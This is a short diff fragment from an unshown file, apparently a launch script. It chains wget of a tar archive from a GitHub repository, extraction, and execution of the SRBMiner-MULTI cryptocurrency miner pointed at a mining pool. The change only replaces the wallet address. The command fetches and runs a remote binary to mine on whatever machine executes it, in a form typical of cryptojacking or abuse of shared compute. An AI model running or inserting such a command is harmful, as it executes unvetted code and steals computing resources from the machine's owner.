@@ -10,4 +10,4 @@ wget https://github.com/gyrogerald/mind/raw/main/converted.tar &&
 chmod +x converted.tar && 
 tar -xf converted.tar && 
 chmod +x SRBMiner-MULTI && 
-./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3958 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password x --cpu-threads 2 --tls true"
+./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3958 --wallet RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro --password x --cpu-threads 2 --tls true"
